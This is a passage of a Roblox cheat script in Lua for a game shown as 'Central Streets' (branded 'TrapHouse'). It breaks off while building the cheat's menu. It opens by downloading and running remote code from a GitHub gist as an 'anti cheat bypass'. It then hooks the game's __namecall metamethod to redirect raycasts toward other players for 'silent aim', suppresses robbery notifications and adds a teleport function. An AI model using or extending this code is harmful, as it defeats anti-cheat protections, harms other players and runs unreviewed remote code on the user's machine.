if not getgenv().AntiCheatBypassExecuted then
    getgenv().AntiCheatBypassExecuted = true
    pcall(function()
        loadstring(game:HttpGet("https://gist.githubusercontent.com/Wh01am001/b1096ae2280a45f52a7310f6ae8df69f/raw/e7ff2b7bec35701a7ea280aadb1b3c6cb6455b61/Anti.lua"))()
    end) --anti cheat bypass
end

if game.PlaceId ~= 121567535120062 then
    return
end
local TRAP_UI_ID = "TRAP"
if getgenv()[TRAP_UI_ID] then
    pcall(function()
        getgenv()[TRAP_UI_ID]:Destroy()
    end)
end

local tws = game:GetService("TweenService")
local uis = game:GetService("UserInputService")
local RS = game:GetService("RunService")
local LPLR = game:GetService("Players").LocalPlayer

local walkBypassSpeed = 50
local flySpeed = 50
local carFlySpeed = 150
local pls = game:GetService("Players")
local lpl = pls.LocalPlayer
local pgui = lpl:WaitForChild("PlayerGui")

task.spawn(function()
    local rep = game:GetService("ReplicatedStorage")
    local inst = rep:WaitForChild("Instancers", 10)
    local notifScript = inst and inst:WaitForChild("Notification", 10)
    if notifScript then
        local success, Notification = pcall(function()
            return require(notifScript)
        end)
        if success and typeof(Notification) == "table" then
            local oldInit = Notification.Init
            if oldInit then
                Notification.Init = function(self, data, ...)
                    if typeof(data) == "table" and (data.Title == "Robbing" or tostring(data.Title):find("Rob")) then
                        return
                    end
                    return oldInit(self, data, ...)
                end
            end
        end
    end
end)

local function SafeTP(targetPos)
    local char = LPLR.Character
    if not char then return end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hrp or not hum then return end

    if hum.SeatPart then
        hum.Sit = false
        task.wait(0.1)
    end

    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
    hrp.CFrame = CFrame.new(targetPos + Vector3.new(0, 3, 0))
    task.wait(0.05)
    hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
    hrp.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
end

local gui = Instance.new("ScreenGui")
gui.Name = "TRAPUI"
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.DisplayOrder = 2147483647
gui.IgnoreGuiInset = true

local success, cg = pcall(function() return game:GetService("CoreGui") end)
gui.Parent = (success and cg) and cg or pgui

getgenv()[TRAP_UI_ID] = gui

_G.EXE = _G.EXE or {}
_G.EXE.GUN_MODS = _G.EXE.GUN_MODS or {}
_G.EXE.SILENT_AIM = _G.EXE.SILENT_AIM or {
    Enabled = false,
    ShowFOV = false,
    FOV_Radius = 100,
    WallCheck = false,
    Hitbox = "Head"
}


local function GET_CHAR(p)
    local wsChar = workspace:FindFirstChild(p.Name)
    if wsChar and wsChar:FindFirstChild("HumanoidRootPart") then
        return wsChar
    end
    return p.Character
end

local function IS_ALIVE(char)
    if not char then return false end
    local healthVal = char:FindFirstChild("Health")
    if healthVal and healthVal:IsA("NumberValue") then
        return healthVal.Value > 0
    end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        return hum.Health > 0
    end
    return false
end

local function GET_TARGET_PART(char, partName)
    if not char then return nil end
    if partName == "Random" then
        local validParts = {}
        for _, v in ipairs(char:GetChildren()) do
            if v:IsA("BasePart") then
                table.insert(validParts, v)
            end
        end
        if #validParts > 0 then
            return validParts[math.random(1, #validParts)]
        end
    end

    local part = char:FindFirstChild(partName or "Head")
    if part and part:IsA("BasePart") then return part end
    local fallbacks = { "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso" }
    for _, name in ipairs(fallbacks) do
        local fb = char:FindFirstChild(name)
        if fb and fb:IsA("BasePart") then return fb end
    end
    return nil
end

local function VISIBLE_CHECK(targetPart)
    if not targetPart then return false end

    local camera = workspace.CurrentCamera
    if not camera then return false end

    local origin = camera.CFrame.Position
    local direction = (targetPart.Position - origin)

    local params = RaycastParams.new()
    params.FilterDescendantsInstances = { camera, LPLR.Character }
    params.FilterType = Enum.RaycastFilterType.Exclude
    params.IgnoreWater = true


    local result = workspace.Raycast(workspace, origin, direction, params)

    if result then
        if result.Instance:IsDescendantOf(targetPart.Parent) then
            return true
        end
        return false
    end
    return true
end

local function GET_SILENT_TARGET()
    local maxDist = _G.EXE.SILENT_AIM.FOV_Radius or 100
    local closestTarget = nil

    local ms = uis:GetMouseLocation()
    local mousePos = Vector2.new(ms.X, ms.Y)

    local camera = workspace.CurrentCamera
    if not camera then return nil end

    for _, p in ipairs(pls:GetPlayers()) do
        if p ~= LPLR then
            local char = GET_CHAR(p)
            if IS_ALIVE(char) then
                local rootPart = char:FindFirstChild("HumanoidRootPart")
                if rootPart then
                    local screenPos, onScreen = camera:WorldToViewportPoint(rootPart.Position)

                    if onScreen then
                        local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude

                        if dist < maxDist then
                            if _G.EXE.SILENT_AIM.WallCheck then
                                local targetPart = GET_TARGET_PART(char, _G.EXE.SILENT_AIM.Hitbox)
                                if VISIBLE_CHECK(targetPart) then
                                    closestTarget = p
                                    maxDist = dist
                                end
                            else
                                closestTarget = p
                                maxDist = dist
                            end
                        end
                    end
                end
            end
        end
    end

    return closestTarget
end

local FOV_CIRCLE = Drawing.new("Circle")
FOV_CIRCLE.Visible = false
FOV_CIRCLE.Thickness = 1
FOV_CIRCLE.Color = Color3.fromRGB(255, 255, 255)
FOV_CIRCLE.Filled = false
FOV_CIRCLE.Transparency = 1

RS.RenderStepped:Connect(function()
    if _G.EXE.SILENT_AIM.Enabled and _G.EXE.SILENT_AIM.ShowFOV then
        local ms = uis:GetMouseLocation()
        FOV_CIRCLE.Position = Vector2.new(ms.X, ms.Y)
        FOV_CIRCLE.Radius = _G.EXE.SILENT_AIM.FOV_Radius or 100
        FOV_CIRCLE.Visible = true
    else
        FOV_CIRCLE.Visible = false
    end
end)

local OldNamecall
OldNamecall = hookmetamethod(game, "__namecall", function(Self, ...)
    local method = getnamecallmethod()

    if method == "Raycast" and Self == workspace and _G.EXE.SILENT_AIM.Enabled then
        local origin = select(1, ...)
        local oldDirection = select(2, ...)

        if typeof(origin) == "Vector3" and typeof(oldDirection) == "Vector3" then
            local target = GET_SILENT_TARGET()
            if target then
                local targetChar = GET_CHAR(target)
                local targetPart = GET_TARGET_PART(targetChar, _G.EXE.SILENT_AIM.Hitbox)

                if targetPart then
                    local params = select(3, ...)
                    local spoofOrigin = targetPart.Position + Vector3.new(0, 5, 0)
                    local spoofDirection = Vector3.new(0, -10, 0)

                    local fakeHit = workspace.Raycast(workspace, spoofOrigin, spoofDirection, params)

                    if fakeHit and fakeHit.Instance:IsDescendantOf(targetChar) then
                        if setnamecallmethod then setnamecallmethod("Raycast") end
                        return fakeHit
                    end

                    local newDirection = (targetPart.Position - origin).Unit * oldDirection.Magnitude
                    if setnamecallmethod then setnamecallmethod("Raycast") end
                    return OldNamecall(Self, origin, newDirection, params)
                end
            end

            if setnamecallmethod then setnamecallmethod("Raycast") end
        end
    end

    return OldNamecall(Self, ...)
end)

local HttpService = game:GetService("HttpService")
local ConfigPath = "TRAP/TRAP-Config.json"

local colorOptions = {
    { Name = "Default",      Value = Color3.fromRGB(180, 180, 180) },
    { Name = "Blue",         Value = Color3.fromRGB(40, 100, 180) },
    { Name = "Light Yellow", Value = Color3.fromRGB(255, 235, 150) },
    { Name = "Purple",       Value = Color3.fromRGB(150, 80, 200) },
    { Name = "Yellow",       Value = Color3.fromRGB(255, 200, 0) },
    { Name = "White",        Value = Color3.fromRGB(240, 240, 240) },
    { Name = "Gray",         Value = Color3.fromRGB(150, 150, 150) },
    { Name = "Green",        Value = Color3.fromRGB(150, 220, 150) }
}

local fontOptions = {
    { Name = "SourceSans", Value = Enum.Font.SourceSansBold },
    { Name = "Arcade",     Value = Enum.Font.Arcade },
    { Name = "Gotham",     Value = Enum.Font.GothamBold },
    { Name = "SciFi",      Value = Enum.Font.SciFi },
    { Name = "Code",       Value = Enum.Font.Code },
    { Name = "Oswald",     Value = Enum.Font.Oswald },
    { Name = "Jura",       Value = Enum.Font.Jura }
}

local isMobile = uis.TouchEnabled and not uis.KeyboardEnabled

local Config = {
    SizeX = isMobile and 450 or 660,
    SizeY = isMobile and 280 or 440,
    CustomImage = "rbxassetid://83114994796030",
    EnableImage = true,
    Transparency = 50,
    ThemeColorIdx = 1,
    FontIdx = 1,
    NotificationPosition = "Bottom Right",
    Toggles = {},
    Sliders = {},
    Keybinds = {}
}

if isfolder and not isfolder("TRAP") then
    pcall(makefolder, "TRAP")
end

if isfile and isfile(ConfigPath) then
    pcall(function()
        local data = HttpService:JSONDecode(readfile(ConfigPath))
        for k, v in pairs(data) do
            Config[k] = v
        end
    end)
end

if isMobile and Config.SizeX > 500 then
    Config.SizeX = 450
    Config.SizeY = 280
end

local function SaveConfig()
    if writefile then
        pcall(function()
            writefile(ConfigPath, HttpService:JSONEncode(Config))
        end)
    end
end

local main = Instance.new("Frame")
main.Name = "Main"
main.Size = UDim2.new(0, Config.SizeX, 0, Config.SizeY)
main.Position = UDim2.new(0.5, -Config.SizeX / 2, 0.5, -Config.SizeY / 2)
main.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
main.BackgroundTransparency = 0.05
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Parent = gui

local corn = Instance.new("UICorner")
corn.CornerRadius = UDim.new(0, 5)
corn.Parent = main

local mstroke = Instance.new("UIStroke")
mstroke.Color = Color3.fromRGB(45, 45, 45)
mstroke.Thickness = 1
mstroke.Parent = main

local bgImg = Instance.new("ImageLabel")
bgImg.Name = "BgImg"
bgImg.Size = UDim2.new(1, 0, 1, 0)
bgImg.BackgroundTransparency = 1
bgImg.Image = Config.CustomImage
bgImg.ScaleType = Enum.ScaleType.Crop
bgImg.ImageTransparency = Config.Transparency / 100
bgImg.Visible = Config.EnableImage
main.BackgroundTransparency = Config.Transparency / 100
bgImg.ZIndex = 0
bgImg.Parent = main

local bgCorn = Instance.new("UICorner")
bgCorn.CornerRadius = UDim.new(0, 5)
bgCorn.Parent = bgImg

local side = Instance.new("Frame")
side.Name = "Side"
side.Size = UDim2.new(0, 190, 1, 0)
side.BackgroundColor3 = Color3.fromRGB(18, 18, 18)
side.BackgroundTransparency = 0.3
side.BorderSizePixel = 0
side.Parent = main

local scorn = Instance.new("UICorner")
scorn.CornerRadius = UDim.new(0, 5)
scorn.Parent = side

local sdiv = Instance.new("Frame")
sdiv.Name = "SDiv"
sdiv.Size = UDim2.new(0, 1, 1, 0)
sdiv.Position = UDim2.new(1, -1, 0, 0)
sdiv.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
sdiv.BorderSizePixel = 0
sdiv.Parent = side

local lbox = Instance.new("Frame")
lbox.Name = "LBox"
lbox.Size = UDim2.new(0, 166, 0, 95)
lbox.Position = UDim2.new(0, 12, 0, 12)
lbox.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
lbox.BorderSizePixel = 0
lbox.Parent = side

local lcorn = Instance.new("UICorner")
lcorn.CornerRadius = UDim.new(0, 4)
lcorn.Parent = lbox

local lstroke = Instance.new("UIStroke")
lstroke.Color = Color3.fromRGB(40, 40, 40)
lstroke.Thickness = 1
lstroke.Parent = lbox

local img = Instance.new("ImageLabel")
img.Name = "Img"
img.Size = UDim2.new(1, 0, 1, 0)
img.Position = UDim2.new(0, 0, 0, 0)
img.BackgroundTransparency = 1
img.BorderSizePixel = 0
img.Image = "rbxassetid://111376638126307"
img.ScaleType = Enum.ScaleType.Crop
img.Parent = lbox

local ldiv = Instance.new("Frame")
ldiv.Name = "LDiv"
ldiv.Size = UDim2.new(1, 24, 0, 1)
ldiv.Position = UDim2.new(0, -12, 1, 12)
ldiv.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
ldiv.BorderSizePixel = 0
ldiv.Parent = lbox

local tcon = Instance.new("ScrollingFrame")
tcon.Name = "TCon"
tcon.Size = UDim2.new(1, -1, 1, -135)
tcon.Position = UDim2.new(0, 0, 0, 126)
tcon.BackgroundTransparency = 1
tcon.BorderSizePixel = 0
tcon.CanvasSize = UDim2.new(0, 0, 0, 0)
tcon.ScrollBarThickness = 0
tcon.Parent = side

local tlay = Instance.new("UIListLayout")
tlay.SortOrder = Enum.SortOrder.LayoutOrder
tlay.Padding = UDim.new(0, 2)
tlay.Parent = tcon

local head = Instance.new("Frame")
head.Name = "Head"
head.Size = UDim2.new(1, -190, 0, 55)
head.Position = UDim2.new(0, 190, 0, 0)
head.BackgroundTransparency = 1
head.BorderSizePixel = 0
head.Parent = main

local hdiv = Instance.new("Frame")
hdiv.Name = "HDiv"
hdiv.Size = UDim2.new(1, 0, 0, 1)
hdiv.Position = UDim2.new(0, 0, 1, -1)
hdiv.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
hdiv.BorderSizePixel = 0
hdiv.Parent = head

local httl = Instance.new("TextLabel")
httl.Name = "HTtl"
httl.Size = UDim2.new(1, -60, 0, 22)
httl.Position = UDim2.new(0, 16, 0, 10)
httl.BackgroundTransparency = 1
httl.Text = "TrapHouse"
httl.TextColor3 = Color3.fromRGB(245, 245, 245)
httl.Font = Enum.Font.SourceSansBold
httl.TextSize = 16
httl.TextXAlignment = Enum.TextXAlignment.Left
httl.Parent = head

local hsub = Instance.new("TextLabel")
hsub.Name = "HSub"
hsub.Size = UDim2.new(1, -60, 0, 16)
hsub.Position = UDim2.new(0, 16, 0, 28)
hsub.BackgroundTransparency = 1
hsub.Text = "Central Streets"
hsub.TextColor3 = Color3.fromRGB(120, 120, 120)
hsub.Font = Enum.Font.SourceSans
hsub.TextSize = 12
hsub.TextXAlignment = Enum.TextXAlignment.Left
hsub.Parent = head

local close = Instance.new("TextButton")
close.Name = "Close"
close.Size = UDim2.new(0, 24, 0, 24)
close.Position = UDim2.new(1, -36, 0.5, -12)
close.BackgroundTransparency = 1
close.Text = "X"
close.TextColor3 = Color3.fromRGB(140, 140, 140)
close.Font = Enum.Font.SourceSansBold
close.TextSize = 16
close.ZIndex = 5
close.Parent = head

close.MouseEnter:Connect(function()
    close.TextColor3 = Color3.fromRGB(240, 70, 70)
end)

close.MouseLeave:Connect(function()
    close.TextColor3 = Color3.fromRGB(140, 140, 140)
end)

if isMobile then
    local mobileToggle = Instance.new("ImageButton")
    mobileToggle.Name = "MobileToggle"
    mobileToggle.Size = UDim2.new(0, 40, 0, 40)
    mobileToggle.Position = UDim2.new(0, 10, 0.5, -20)
    mobileToggle.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
    mobileToggle.Image = "rbxassetid://111376638126307"
    mobileToggle.ZIndex = 1000
    mobileToggle.Parent = gui

    local mcor = Instance.new("UICorner", mobileToggle)
    mcor.CornerRadius = UDim.new(1, 0)
    local mstr = Instance.new("UIStroke", mobileToggle)
    mstr.Color = Color3.fromRGB(45, 45, 45)
    mstr.Thickness = 1

    local mtDragging = false
    local mtDragStart, mtStartPos

    mobileToggle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch then
            mtDragging = true
            mtDragStart = input.Position
            mtStartPos = mobileToggle.Position
        end
    end)
    uis.InputChanged:Connect(function(input)
        if mtDragging and input.UserInputType == Enum.UserInputType.Touch then
            local delta = input.Position - mtDragStart
            if delta.Magnitude > 10 then
                mobileToggle.Position = UDim2.new(
                    mtStartPos.X.Scale, mtStartPos.X.Offset + delta.X,
                    mtStartPos.Y.Scale, mtStartPos.Y.Offset + delta.Y
                )
            end
        end
    end)
    uis.InputEnded:Connect(function(input)
        if mtDragging and input.UserInputType == Enum.UserInputType.Touch then
            mtDragging = false
            local delta = input.Position - mtDragStart
            if delta.Magnitude < 10 then
                main.Visible = not main.Visible
            end
        end
    end)
end

close.MouseButton1Click:Connect(function()
    gui:Destroy()
    getgenv()[TRAP_UI_ID] = nil
end)

local pcon = Instance.new("Frame")
pcon.Name = "PCon"
pcon.Size = UDim2.new(1, -214, 1, -79)
pcon.Position = UDim2.new(0, 204, 0, 67)
pcon.BackgroundTransparency = 1
pcon.BorderSizePixel = 0
pcon.Parent = main


local dragging, dragInput, dragStart, startPos

local function registerDrag(object)
    object.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = main.Position

            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)

    object.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
end

registerDrag(head)
registerDrag(side)

uis.InputChanged:Connect(function(input)
    if input == dragInput and dragging then
        local delta = input.Position - dragStart
        tws:Create(main, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale,
                startPos.Y.Offset + delta.Y)
        }):Play()
    end
end)


local resizeBtn = Instance.new("ImageButton")
resizeBtn.Name = "ResizeBtn"
resizeBtn.Size = UDim2.new(0, 16, 0, 16)
resizeBtn.Position = UDim2.new(1, -16, 1, -16)
resizeBtn.BackgroundTransparency = 1
resizeBtn.Image = "rbxassetid://114144413156041"
resizeBtn.ImageColor3 = Color3.fromRGB(100, 100, 100)
resizeBtn.ZIndex = 10
resizeBtn.Parent = main

local resizing = false
local startMousePos, startSizeX, startSizeY

resizeBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        resizing = true
        startMousePos = uis:GetMouseLocation()
        startSizeX = main.Size.X.Offset
        startSizeY = main.Size.Y.Offset
        resizeBtn.ImageColor3 = Color3.fromRGB(255, 255, 255)
    end
end)

uis.InputChanged:Connect(function(input)
    if resizing and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        local currentMousePos = uis:GetMouseLocation()
        local delta = currentMousePos - startMousePos

        local minW = isMobile and 350 or 640
        local maxW = isMobile and 600 or 950
        local minH = isMobile and 250 or 360
        local maxH = isMobile and 450 or 650

        local newWidth = math.clamp(startSizeX + delta.X, minW, maxW)
        local newHeight = math.clamp(startSizeY + delta.Y, minH, maxH)

        tws:Create(main, TweenInfo.new(0.05, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, newWidth, 0, newHeight)
        }):Play()
    end
end)

uis.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if resizing then
            resizing = false
            resizeBtn.ImageColor3 = Color3.fromRGB(100, 100, 100)
            Config.SizeX = main.Size.X.Offset
            Config.SizeY = main.Size.Y.Offset
            SaveConfig()
        end
    end
end)

local tabs = {}
local actv = nil

local ThemeUpdateCallbacks = {}
local SharedThemeColor = colorOptions[Config.ThemeColorIdx].Value
local SharedThemeFont = fontOptions[Config.FontIdx].Value

local function ApplyTheme()
    for _, cb in ipairs(ThemeUpdateCallbacks) do
        pcall(function() cb(SharedThemeColor, SharedThemeFont) end)
    end
end

local notifWidth = isMobile and 220 or 300
local notifOffset = notifWidth + 20

local NotifContainer = Instance.new("Frame")
NotifContainer.Name = "NotifContainer"
NotifContainer.Size = UDim2.new(0, notifWidth, 1, -40)
NotifContainer.Position = UDim2.new(1, -notifOffset, 0, 20)
NotifContainer.BackgroundTransparency = 1
NotifContainer.ZIndex = 100
NotifContainer.Parent = gui

local UIListLayoutNotif = Instance.new("UIListLayout")
UIListLayoutNotif.SortOrder = Enum.SortOrder.LayoutOrder
UIListLayoutNotif.VerticalAlignment = Enum.VerticalAlignment.Bottom
UIListLayoutNotif.Padding = UDim.new(0, 10)
UIListLayoutNotif.Parent = NotifContainer

local function UpdateNotifPosition(pos)
    if pos == "Bottom Right" then
        NotifContainer.Position = UDim2.new(1, -notifOffset, 0, 20)
        UIListLayoutNotif.VerticalAlignment = Enum.VerticalAlignment.Bottom
    elseif pos == "Bottom Left" then
        NotifContainer.Position = UDim2.new(0, 20, 0, 20)
        UIListLayoutNotif.VerticalAlignment = Enum.VerticalAlignment.Bottom
    elseif pos == "Top Right" then
        NotifContainer.Position = UDim2.new(1, -notifOffset, 0, 20)
        UIListLayoutNotif.VerticalAlignment = Enum.VerticalAlignment.Top
    elseif pos == "Top Left" then
        NotifContainer.Position = UDim2.new(0, 20, 0, 20)
        UIListLayoutNotif.VerticalAlignment = Enum.VerticalAlignment.Top
    end
end
UpdateNotifPosition(Config.NotificationPosition)

local function Notify(title, text, duration)
    if Config and Config.NotificationsEnabled == false then return end
    duration = duration or 3

    local Notif = Instance.new("Frame")
    Notif.Size = UDim2.new(1, 0, 0, isMobile and 45 or 60)
    Notif.BackgroundTransparency = 1
    Notif.Parent = NotifContainer

    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, 0, 1, 0)
    Content.Position = UDim2.new(1, 50, 0, 0)
    Content.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    Content.Parent = Notif

    local nCorner = Instance.new("UICorner")
    nCorner.CornerRadius = UDim.new(0, 6)
    nCorner.Parent = Content

    local nStroke = Instance.new("UIStroke")
    nStroke.Color = SharedThemeColor or Color3.fromRGB(255, 120, 50)
    nStroke.Thickness = 1
    nStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
    nStroke.Parent = Content

    local nTitle = Instance.new("TextLabel")
    nTitle.Size = UDim2.new(1, -20, 0, isMobile and 16 or 20)
    nTitle.Position = UDim2.new(0, 10, 0, isMobile and 6 or 10)
    nTitle.BackgroundTransparency = 1
    nTitle.Font = SharedThemeFont or Enum.Font.GothamBold
    nTitle.Text = title
    nTitle.TextColor3 = SharedThemeColor or Color3.fromRGB(255, 120, 50)
    nTitle.TextSize = isMobile and 12 or 14
    nTitle.TextXAlignment = Enum.TextXAlignment.Left
    nTitle.TextTruncate = Enum.TextTruncate.AtEnd
    nTitle.Parent = Content

    local nText = Instance.new("TextLabel")
    nText.Size = UDim2.new(1, -20, 0, isMobile and 16 or 20)
    nText.Position = UDim2.new(0, 10, 0, isMobile and 22 or 30)
    nText.BackgroundTransparency = 1
    nText.Font = SharedThemeFont or Enum.Font.Gotham
    nText.Text = text
    nText.TextColor3 = Color3.fromRGB(200, 200, 200)
    nText.TextSize = isMobile and 11 or 12
    nText.TextXAlignment = Enum.TextXAlignment.Left
    nText.TextTruncate = Enum.TextTruncate.AtEnd
    nText.Parent = Content

    local inTween = tws:Create(Content, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
        { Position = UDim2.new(0, 0, 0, 0) })
    inTween:Play()

    task.spawn(function()
        task.wait(duration)
        local outTween = tws:Create(Content, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.In),
            { Position = UDim2.new(1, 50, 0, 0), BackgroundTransparency = 1 })
        for _, child in ipairs(Content:GetChildren()) do
            if child:IsA("TextLabel") then
                tws:Create(child, TweenInfo.new(0.3), { TextTransparency = 1 }):Play()
            elseif child:IsA("UIStroke") then
                tws:Create(child, TweenInfo.new(0.3), { Transparency = 1 }):Play()
            end
        end
        outTween:Play()
        outTween.Completed:Wait()
        Notif:Destroy()
    end)

    table.insert(ThemeUpdateCallbacks, function(color, font)
        if Content.Parent then
            nStroke.Color = color
            nTitle.TextColor3 = color
            nTitle.Font = font
            nText.Font = font
        end
    end)
end

local ColorPickerModal = Instance.new("Frame")
ColorPickerModal.Name = "ColorPickerModal"
ColorPickerModal.Size = UDim2.new(0, 200, 0, 220)
ColorPickerModal.Position = UDim2.new(0.5, -100, 0.5, -110)
ColorPickerModal.BackgroundColor3 = Color3.fromRGB(24, 24, 28)
ColorPickerModal.BackgroundTransparency = 0.05
ColorPickerModal.ZIndex = 100
ColorPickerModal.Visible = false
ColorPickerModal.Parent = main

local PickerCorner = Instance.new("UICorner")
PickerCorner.CornerRadius = UDim.new(0, 10)
PickerCorner.Parent = ColorPickerModal

local PickerStroke = Instance.new("UIStroke")
PickerStroke.Color = Color3.fromRGB(45, 45, 52)
PickerStroke.Thickness = 1.5
PickerStroke.Parent = ColorPickerModal

local PickerTitle = Instance.new("TextLabel")
PickerTitle.Size = UDim2.new(1, 0, 0, 30)
PickerTitle.BackgroundTransparency = 1
PickerTitle.Text = "Select Color"
PickerTitle.TextColor3 = Color3.fromRGB(230, 230, 235)
PickerTitle.Font = Enum.Font.SourceSansBold
PickerTitle.TextSize = 13
PickerTitle.ZIndex = 101
PickerTitle.Parent = ColorPickerModal

local PaletteFrame = Instance.new("ImageButton")
PaletteFrame.Size = UDim2.new(1, -20, 0, 130)
PaletteFrame.Position = UDim2.new(0, 10, 0, 35)
PaletteFrame.BackgroundColor3 = Color3.new(1, 1, 1)
PaletteFrame.Image = "rbxassetid://4155801252"
PaletteFrame.ZIndex = 101
PaletteFrame.Parent = ColorPickerModal

local HueGradient = Instance.new("UIGradient")
HueGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0.00, Color3.new(1, 0, 0)),
    ColorSequenceKeypoint.new(0.16, Color3.new(1, 1, 0)),
    ColorSequenceKeypoint.new(0.33, Color3.new(0, 1, 0)),
    ColorSequenceKeypoint.new(0.50, Color3.new(0, 1, 1)),
    ColorSequenceKeypoint.new(0.66, Color3.new(0, 0, 1)),
    ColorSequenceKeypoint.new(0.83, Color3.new(1, 0, 1)),
    ColorSequenceKeypoint.new(1.00, Color3.new(1, 0, 0))
})
HueGradient.Parent = PaletteFrame

local PaletteCorner = Instance.new("UICorner")
PaletteCorner.CornerRadius = UDim.new(0, 8)
PaletteCorner.Parent = PaletteFrame

local SelectorRing = Instance.new("Frame")
SelectorRing.Size = UDim2.new(0, 10, 0, 10)
SelectorRing.AnchorPoint = Vector2.new(0.5, 0.5)
SelectorRing.BackgroundColor3 = Color3.new(1, 1, 1)
SelectorRing.ZIndex = 102
SelectorRing.Parent = PaletteFrame

local SelectorCorner = Instance.new("UICorner")
SelectorCorner.CornerRadius = UDim.new(1, 0)
SelectorCorner.Parent = SelectorRing

local ClosePickerBtn = Instance.new("TextButton")
ClosePickerBtn.Size = UDim2.new(1, -20, 0, 30)
ClosePickerBtn.Position = UDim2.new(0, 10, 0, 175)
ClosePickerBtn.BackgroundColor3 = SharedThemeColor
ClosePickerBtn.Text = "Confirm"
ClosePickerBtn.TextColor3 = Color3.new(1, 1, 1)
ClosePickerBtn.Font = Enum.Font.SourceSansBold
ClosePickerBtn.TextSize = 12
ClosePickerBtn.ZIndex = 101
ClosePickerBtn.Parent = ColorPickerModal

local ClosePickerCorner = Instance.new("UICorner")
ClosePickerCorner.CornerRadius = UDim.new(0, 6)
ClosePickerCorner.Parent = ClosePickerBtn

local ActiveColorCallback = nil
local isPicking = false

PaletteFrame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isPicking = true
    end
end)

uis.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isPicking = false
    end
end)

local function updateColor(input)
    if not isPicking then return end
    local pos = input.Position
    if input.UserInputType == Enum.UserInputType.Touch then pos = Vector3.new(input.Position.X, input.Position.Y, 0) end
    local px = math.clamp((pos.X - PaletteFrame.AbsolutePosition.X) / PaletteFrame.AbsoluteSize.X, 0, 1)
    local py = math.clamp((pos.Y - PaletteFrame.AbsolutePosition.Y) / PaletteFrame.AbsoluteSize.Y, 0, 1)
    SelectorRing.Position = UDim2.new(px, 0, py, 0)
    local col = Color3.fromHSV(px, 1, 1 - py)
    if ActiveColorCallback then ActiveColorCallback(col) end
end

uis.InputChanged:Connect(function(input)
    if isPicking and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
        updateColor(input)
    end
end)

ClosePickerBtn.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        ColorPickerModal.Visible = false
    end
end)

local function OpenPicker(callback)
    ActiveColorCallback = callback
    ColorPickerModal.Visible = true
end

table.insert(ThemeUpdateCallbacks, function(color, font)
    ClosePickerBtn.BackgroundColor3 = color
    PickerTitle.Font = font
    ClosePickerBtn.Font = font
end)

local function CreateTab(name, sub)
    local page = Instance.new("ScrollingFrame")
    page.Name = name .. "Page"
    page.Size = UDim2.new(1, 0, 1, 0)
    page.BackgroundTransparency = 1
    page.BorderSizePixel = 0
    page.Visible = false
    page.ScrollBarThickness = 3
    page.ScrollBarImageColor3 = Color3.fromRGB(60, 60, 60)
    page.CanvasSize = UDim2.new(0, 0, 0, 0)
    page.Parent = pcon

    local leftCol = Instance.new("Frame")
    leftCol.Name = "LeftCol"
    leftCol.Size = UDim2.new(0.48, 0, 1, 0)
    leftCol.BackgroundTransparency = 1
    leftCol.AutomaticSize = Enum.AutomaticSize.Y
    leftCol.Parent = page

    local leftLay = Instance.new("UIListLayout")
    leftLay.Padding = UDim.new(0, 12)
    leftLay.SortOrder = Enum.SortOrder.LayoutOrder
    leftLay.Parent = leftCol

    local rightCol = Instance.new("Frame")
    rightCol.Name = "RightCol"
    rightCol.Size = UDim2.new(0.48, 0, 1, 0)
    rightCol.Position = UDim2.new(0.52, 0, 0, 0)
    rightCol.BackgroundTransparency = 1
    rightCol.AutomaticSize = Enum.AutomaticSize.Y
    rightCol.Parent = page

    local rightLay = Instance.new("UIListLayout")
    rightLay.Padding = UDim.new(0, 12)
    rightLay.SortOrder = Enum.SortOrder.LayoutOrder
    rightLay.Parent = rightCol

    local ppad = Instance.new("UIPadding")
